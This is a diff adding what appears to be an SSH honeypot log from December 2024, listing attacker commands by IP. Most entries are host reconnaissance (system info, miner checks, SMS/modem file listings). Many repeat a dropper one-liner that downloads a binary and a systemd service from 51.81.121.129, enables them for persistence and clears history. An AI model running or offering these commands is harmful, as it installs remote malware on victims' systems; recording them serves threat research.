@@ -1,0 +1,485 @@
+start
+2024-12-07 13:11:37.571745 - ('210.206.57.172', 59211) - /ip cloud print
+2024-12-07 13:11:39.072390 - ('210.206.57.172', 59211) - ifconfig
+2024-12-07 13:11:41.160154 - ('210.206.57.172', 59211) - uname -a
+2024-12-07 13:11:42.819701 - ('210.206.57.172', 59211) - cat /proc/cpuinfo
+2024-12-07 13:11:45.856690 - ('210.206.57.172', 59211) - ps | grep '[Mm]iner'
+2024-12-07 13:11:47.092705 - ('210.206.57.172', 59211) - ps -ef | grep '[Mm]iner'
+2024-12-07 13:11:48.315240 - ('210.206.57.172', 59211) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
+2024-12-07 13:11:49.552196 - ('210.206.57.172', 59211) - echo Hi | cat -n
+2024-12-07 14:27:15.035141 - ('125.186.58.82', 59241) - /ip cloud print
+2024-12-07 14:27:16.666453 - ('125.186.58.82', 59241) - ifconfig
+2024-12-07 14:27:18.010470 - ('125.186.58.82', 59241) - uname -a
+2024-12-07 14:27:19.354289 - ('125.186.58.82', 59241) - cat /proc/cpuinfo
+2024-12-07 14:27:20.698045 - ('125.186.58.82', 59241) - ps | grep '[Mm]iner'
+2024-12-07 14:27:22.045807 - ('125.186.58.82', 59241) - ps -ef | grep '[Mm]iner'
+2024-12-07 14:27:23.389725 - ('125.186.58.82', 59241) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
+2024-12-07 14:27:24.733840 - ('125.186.58.82', 59241) - echo Hi | cat -n
+2024-12-07 14:40:05.313418 - ('45.148.10.203', 34342) - apt
+2024-12-07 14:40:05.800443 - ('45.148.10.203', 34342) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-12-07 14:40:10.797123 - ('45.148.10.203', 33614) - apt
+2024-12-07 14:40:11.237036 - ('45.148.10.203', 33614) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-12-07 14:40:16.004839 - ('45.148.10.203', 33638) - apt
+2024-12-07 14:40:16.396507 - ('45.148.10.203', 33638) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-12-07 14:40:21.313633 - ('45.148.10.203', 43224) - apt
+2024-12-07 14:40:21.703971 - ('45.148.10.203', 43224) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-12-07 14:46:48.860400 - ('58.148.222.137', 53258) - /ip cloud print
+2024-12-07 14:46:50.492071 - ('58.148.222.137', 53258) - ifconfig
+2024-12-07 14:46:51.831790 - ('58.148.222.137', 53258) - uname -a
+2024-12-07 14:46:53.172357 - ('58.148.222.137', 53258) - cat /proc/cpuinfo
+2024-12-07 14:46:54.512122 - ('58.148.222.137', 53258) - ps | grep '[Mm]iner'
+2024-12-07 14:46:55.852492 - ('58.148.222.137', 53258) - ps -ef | grep '[Mm]iner'
+2024-12-07 14:46:57.194645 - ('58.148.222.137', 53258) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
+2024-12-07 14:46:58.543785 - ('58.148.222.137', 53258) - echo Hi | cat -n
+2024-12-07 15:32:22.215854 - ('124.54.245.234', 59568) - /ip cloud print
+2024-12-07 15:32:23.822885 - ('124.54.245.234', 59568) - ifconfig
+2024-12-07 15:32:25.150903 - ('124.54.245.234', 59568) - uname -a
+2024-12-07 15:32:26.483355 - ('124.54.245.234', 59568) - cat /proc/cpuinfo
+2024-12-07 15:32:27.810591 - ('124.54.245.234', 59568) - ps | grep '[Mm]iner'
+2024-12-07 15:32:29.138456 - ('124.54.245.234', 59568) - ps -ef | grep '[Mm]iner'
+2024-12-07 15:32:30.462584 - ('124.54.245.234', 59568) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
+2024-12-07 15:32:31.798401 - ('124.54.245.234', 59568) - echo Hi | cat -n
+2024-12-07 17:27:19.599071 - ('124.48.39.93', 35071) - /ip cloud print
+2024-12-07 17:27:21.258078 - ('124.48.39.93', 35071) - ifconfig
+2024-12-07 17:27:22.617568 - ('124.48.39.93', 35071) - uname -a
+2024-12-07 17:27:23.977373 - ('124.48.39.93', 35071) - cat /proc/cpuinfo
+2024-12-07 17:27:25.337369 - ('124.48.39.93', 35071) - ps | grep '[Mm]iner'
+2024-12-07 17:27:26.709431 - ('124.48.39.93', 35071) - ps -ef | grep '[Mm]iner'
+2024-12-07 17:27:28.073204 - ('124.48.39.93', 35071) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
+2024-12-07 17:27:29.439719 - ('124.48.39.93', 35071) - echo Hi | cat -n
+2024-12-07 17:45:24.283082 - ('180.226.74.9', 41354) - /ip cloud print
+2024-12-07 17:45:25.914736 - ('180.226.74.9', 41354) - ifconfig
+2024-12-07 17:45:27.254776 - ('180.226.74.9', 41354) - uname -a
+2024-12-07 17:45:28.593585 - ('180.226.74.9', 41354) - cat /proc/cpuinfo
+2024-12-07 17:45:29.933522 - ('180.226.74.9', 41354) - ps | grep '[Mm]iner'
+2024-12-07 17:45:31.273761 - ('180.226.74.9', 41354) - ps -ef | grep '[Mm]iner'
+2024-12-07 17:45:32.613710 - ('180.226.74.9', 41354) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
+2024-12-07 17:45:33.954257 - ('180.226.74.9', 41354) - echo Hi | cat -n
+2024-12-07 18:29:11.241597 - ('49.160.89.162', 54616) - /ip cloud print
+2024-12-07 18:29:12.846930 - ('49.160.89.162', 54616) - ifconfig
+2024-12-07 18:29:14.174875 - ('49.160.89.162', 54616) - uname -a
+2024-12-07 18:29:15.494797 - ('49.160.89.162', 54616) - cat /proc/cpuinfo
+2024-12-07 18:29:16.814694 - ('49.160.89.162', 54616) - ps | grep '[Mm]iner'
+2024-12-07 18:29:18.134555 - ('49.160.89.162', 54616) - ps -ef | grep '[Mm]iner'
+2024-12-07 18:29:19.454507 - ('49.160.89.162', 54616) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
+2024-12-07 18:29:20.774497 - ('49.160.89.162', 54616) - echo Hi | cat -n
+2024-12-07 21:07:22.660122 - ('61.36.209.99', 39714) - /ip cloud print
+2024-12-07 21:07:24.138786 - ('61.36.209.99', 39714) - ifconfig
+2024-12-07 21:07:25.351251 - ('61.36.209.99', 39714) - uname -a
+2024-12-07 21:07:26.574836 - ('61.36.209.99', 39714) - cat /proc/cpuinfo
+2024-12-07 21:07:27.790999 - ('61.36.209.99', 39714) - ps | grep '[Mm]iner'
+2024-12-07 21:07:29.007010 - ('61.36.209.99', 39714) - ps -ef | grep '[Mm]iner'
+2024-12-07 21:07:30.218962 - ('61.36.209.99', 39714) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
+2024-12-07 21:07:31.431104 - ('61.36.209.99', 39714) - echo Hi | cat -n
+2024-12-07 22:54:53.031069 - ('119.68.185.131', 56834) - /ip cloud print
+2024-12-07 22:54:54.687357 - ('119.68.185.131', 56834) - ifconfig
+2024-12-07 22:54:56.051634 - ('119.68.185.131', 56834) - uname -a
+2024-12-07 22:54:57.478976 - ('119.68.185.131', 56834) - cat /proc/cpuinfo
+2024-12-07 22:54:58.842293 - ('119.68.185.131', 56834) - ps | grep '[Mm]iner'
+2024-12-07 22:55:00.202162 - ('119.68.185.131', 56834) - ps -ef | grep '[Mm]iner'
+2024-12-07 22:55:01.566215 - ('119.68.185.131', 56834) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
+2024-12-07 22:55:02.926120 - ('119.68.185.131', 56834) - echo Hi | cat -n
+2024-12-07 23:13:43.852879 - ('45.148.10.46', 38164) - apt
+2024-12-07 23:13:45.244289 - ('45.148.10.46', 38164) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-12-07 23:13:59.345512 - ('45.148.10.46', 55250) - apt
+2024-12-07 23:14:00.463247 - ('45.148.10.46', 55250) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-12-07 23:14:10.747465 - ('45.148.10.46', 42724) - apt
+2024-12-07 23:14:13.544262 - ('45.148.10.46', 42724) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-12-07 23:14:19.184834 - ('45.148.10.46', 54472) - apt
+2024-12-07 23:14:19.645922 - ('45.148.10.46', 54472) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-12-07 23:14:31.344826 - ('45.148.10.46', 40002) - apt
+2024-12-07 23:14:31.744948 - ('45.148.10.46', 40002) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-12-07 23:14:42.246617 - ('45.148.10.46', 40720) - apt
+2024-12-07 23:14:44.751855 - ('45.148.10.46', 40720) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-12-07 23:14:50.551347 - ('45.148.10.46', 52534) - apt
+2024-12-07 23:14:51.042961 - ('45.148.10.46', 52534) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-12-07 23:15:02.158348 - ('45.148.10.46', 34192) - apt
+2024-12-07 23:15:02.744489 - ('45.148.10.46', 34192) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-12-07 23:15:14.848140 - ('45.148.10.46', 49908) - apt
+2024-12-07 23:15:16.554414 - ('45.148.10.46', 49908) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-12-07 23:15:25.760737 - ('45.148.10.46', 48820) - apt
+2024-12-07 23:15:28.145749 - ('45.148.10.46', 48820) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-12-07 23:15:34.843623 - ('45.148.10.46', 35088) - apt
+2024-12-07 23:15:35.179298 - ('45.148.10.46', 35088) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-12-07 23:15:47.548309 - ('45.148.10.46', 35094) - apt
+2024-12-07 23:15:48.242215 - ('45.148.10.46', 35094) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-12-07 23:16:03.142631 - ('45.148.10.46', 42314) - apt
+2024-12-07 23:16:03.645258 - ('45.148.10.46', 42314) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-12-07 23:16:13.178596 - ('45.148.10.46', 33680) - apt
+2024-12-07 23:16:15.850449 - ('45.148.10.46', 33680) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-12-08 00:09:27.351004 - ('185.188.217.98', 53990) - /ip cloud print
+2024-12-08 00:09:27.749594 - ('185.188.217.98', 53990) - ifconfig
+2024-12-08 00:09:28.050199 - ('185.188.217.98', 53990) - uname -a
+2024-12-08 00:09:28.360039 - ('185.188.217.98', 53990) - cat /proc/cpuinfo
+2024-12-08 00:09:28.675829 - ('185.188.217.98', 53990) - ps | grep '[Mm]iner'
+2024-12-08 00:09:28.970126 - ('185.188.217.98', 53990) - ps -ef | grep '[Mm]iner'
+2024-12-08 00:09:29.280386 - ('185.188.217.98', 53990) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
+2024-12-08 00:09:29.580782 - ('185.188.217.98', 53990) - echo Hi | cat -n
+2024-12-08 00:57:41.059032 - ('58.149.239.210', 32825) - /ip cloud print
+2024-12-08 00:57:42.518679 - ('58.149.239.210', 32825) - ifconfig
+2024-12-08 00:57:43.719913 - ('58.149.239.210', 32825) - uname -a
+2024-12-08 00:57:44.910698 - ('58.149.239.210', 32825) - cat /proc/cpuinfo
+2024-12-08 00:57:46.105889 - ('58.149.239.210', 32825) - ps | grep '[Mm]iner'
+2024-12-08 00:57:47.306508 - ('58.149.239.210', 32825) - ps -ef | grep '[Mm]iner'
+2024-12-08 00:57:48.506874 - ('58.149.239.210', 32825) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
+2024-12-08 00:57:49.703080 - ('58.149.239.210', 32825) - echo Hi | cat -n
+2024-12-08 01:47:26.747378 - ('195.178.110.6', 33892) - apt
+2024-12-08 01:47:26.919489 - ('195.178.110.6', 33892) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-12-08 01:47:31.317542 - ('195.178.110.6', 33900) - apt
+2024-12-08 01:47:31.497804 - ('195.178.110.6', 33900) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-12-08 01:47:35.916539 - ('195.178.110.6', 58684) - apt
+2024-12-08 01:47:36.119206 - ('195.178.110.6', 58684) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-12-08 01:47:40.455118 - ('195.178.110.6', 58692) - apt
+2024-12-08 01:47:40.658890 - ('195.178.110.6', 58692) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-12-08 01:47:45.110852 - ('195.178.110.6', 51548) - apt
+2024-12-08 01:47:45.316812 - ('195.178.110.6', 51548) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-12-08 01:47:49.640410 - ('195.178.110.6', 51552) - apt
+2024-12-08 01:47:49.818506 - ('195.178.110.6', 51552) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-12-08 01:47:54.220458 - ('195.178.110.6', 42786) - apt
+2024-12-08 01:47:54.416477 - ('195.178.110.6', 42786) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-12-08 01:47:58.742418 - ('195.178.110.6', 42816) - apt
+2024-12-08 01:47:58.951461 - ('195.178.110.6', 42816) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-12-08 01:48:03.322366 - ('195.178.110.6', 52428) - apt
+2024-12-08 01:48:03.515727 - ('195.178.110.6', 52428) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-12-08 02:05:50.678845 - ('124.54.249.47', 50558) - /ip cloud print
+2024-12-08 02:05:52.286296 - ('124.54.249.47', 50558) - ifconfig
+2024-12-08 02:05:53.606088 - ('124.54.249.47', 50558) - uname -a
+2024-12-08 02:05:54.930121 - ('124.54.249.47', 50558) - cat /proc/cpuinfo
+2024-12-08 02:05:56.254135 - ('124.54.249.47', 50558) - ps | grep '[Mm]iner'
+2024-12-08 02:05:57.577881 - ('124.54.249.47', 50558) - ps -ef | grep '[Mm]iner'
+2024-12-08 02:05:58.897841 - ('124.54.249.47', 50558) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
+2024-12-08 02:06:00.217592 - ('124.54.249.47', 50558) - echo Hi | cat -n
+2024-12-08 06:45:04.369085 - ('45.148.10.203', 53952) - apt
+2024-12-08 06:45:04.546533 - ('45.148.10.203', 53952) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-12-08 08:55:03.963578 - ('124.48.97.167', 41604) - /ip cloud print
+2024-12-08 08:55:05.607672 - ('124.48.97.167', 41604) - ifconfig
+2024-12-08 08:55:06.959477 - ('124.48.97.167', 41604) - uname -a
+2024-12-08 08:55:08.315934 - ('124.48.97.167', 41604) - cat /proc/cpuinfo
+2024-12-08 08:55:09.661805 - ('124.48.97.167', 41604) - ps | grep '[Mm]iner'
+2024-12-08 08:55:11.006360 - ('124.48.97.167', 41604) - ps -ef | grep '[Mm]iner'
+2024-12-08 08:55:12.354678 - ('124.48.97.167', 41604) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
+2024-12-08 08:55:13.706474 - ('124.48.97.167', 41604) - echo Hi | cat -n
+2024-12-08 08:55:22.696704 - ('115.141.177.110', 41552) - /ip cloud print
+2024-12-08 08:55:24.380893 - ('115.141.177.110', 41552) - ifconfig
+2024-12-08 08:55:25.764598 - ('115.141.177.110', 41552) - uname -a
+2024-12-08 09:58:13.504361 - ('58.75.231.245', 51316) - /ip cloud print
+2024-12-08 09:58:15.596702 - ('58.75.231.245', 51316) - ifconfig
+2024-12-08 09:58:16.933824 - ('58.75.231.245', 51316) - uname -a
+2024-12-08 09:58:21.396041 - ('58.75.231.245', 51316) - cat /proc/cpuinfo
+2024-12-08 09:58:23.666921 - ('58.75.231.245', 51316) - ps | grep '[Mm]iner'
+2024-12-08 09:58:24.866891 - ('58.75.231.245', 51316) - ps -ef | grep '[Mm]iner'
+2024-12-08 09:58:26.068245 - ('58.75.231.245', 51316) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
+2024-12-08 09:58:27.262381 - ('58.75.231.245', 51316) - echo Hi | cat -n
+2024-12-08 12:20:36.982504 - ('210.124.173.167', 34406) - /ip cloud print
+2024-12-08 12:20:38.396856 - ('210.124.173.167', 34406) - ifconfig
+2024-12-08 12:20:39.612714 - ('210.124.173.167', 34406) - uname -a
+2024-12-08 12:20:40.836535 - ('210.124.173.167', 34406) - cat /proc/cpuinfo
+2024-12-08 12:20:42.048487 - ('210.124.173.167', 34406) - ps | grep '[Mm]iner'
+2024-12-08 12:20:43.264598 - ('210.124.173.167', 34406) - ps -ef | grep '[Mm]iner'
+2024-12-08 12:20:44.484392 - ('210.124.173.167', 34406) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
+2024-12-08 12:20:45.756440 - ('210.124.173.167', 34406) - echo Hi | cat -n
+2024-12-08 13:32:05.791429 - ('45.148.10.203', 57728) - apt
+2024-12-08 13:32:06.329784 - ('45.148.10.203', 57728) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-12-08 13:32:11.660039 - ('45.148.10.203', 33158) - apt
+2024-12-08 13:32:12.207165 - ('45.148.10.203', 33158) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-12-08 13:32:17.513682 - ('45.148.10.203', 33174) - apt
+2024-12-08 13:32:18.010502 - ('45.148.10.203', 33174) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-12-08 13:34:54.018440 - ('211.53.143.114', 45880) - /ip cloud print
+2024-12-08 13:34:55.558297 - ('211.53.143.114', 45880) - ifconfig
+2024-12-08 13:34:56.754112 - ('211.53.143.114', 45880) - uname -a
+2024-12-08 13:34:58.003873 - ('211.53.143.114', 45880) - cat /proc/cpuinfo
+2024-12-08 13:34:59.227851 - ('211.53.143.114', 45880) - ps | grep '[Mm]iner'
+2024-12-08 13:35:00.437880 - ('211.53.143.114', 45880) - ps -ef | grep '[Mm]iner'
+2024-12-08 13:35:01.681969 - ('211.53.143.114', 45880) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
+2024-12-08 13:35:02.934171 - ('211.53.143.114', 45880) - echo Hi | cat -n
+2024-12-08 13:44:13.406571 - ('115.141.230.146', 56353) - /ip cloud print
+2024-12-08 13:44:15.041674 - ('115.141.230.146', 56353) - ifconfig
+2024-12-08 13:44:16.390031 - ('115.141.230.146', 56353) - uname -a
+2024-12-08 13:44:17.737862 - ('115.141.230.146', 56353) - cat /proc/cpuinfo
+2024-12-08 13:44:19.080527 - ('115.141.230.146', 56353) - ps | grep '[Mm]iner'
+2024-12-08 13:44:20.425894 - ('115.141.230.146', 56353) - ps -ef | grep '[Mm]iner'
+2024-12-08 13:44:21.774093 - ('115.141.230.146', 56353) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
+2024-12-08 13:44:23.120594 - ('115.141.230.146', 56353) - echo Hi | cat -n
+2024-12-08 14:48:32.837759 - ('178.128.161.183', 50584) - uname -s -m
+2024-12-08 15:05:16.902255 - ('195.178.110.6', 38358) - apt
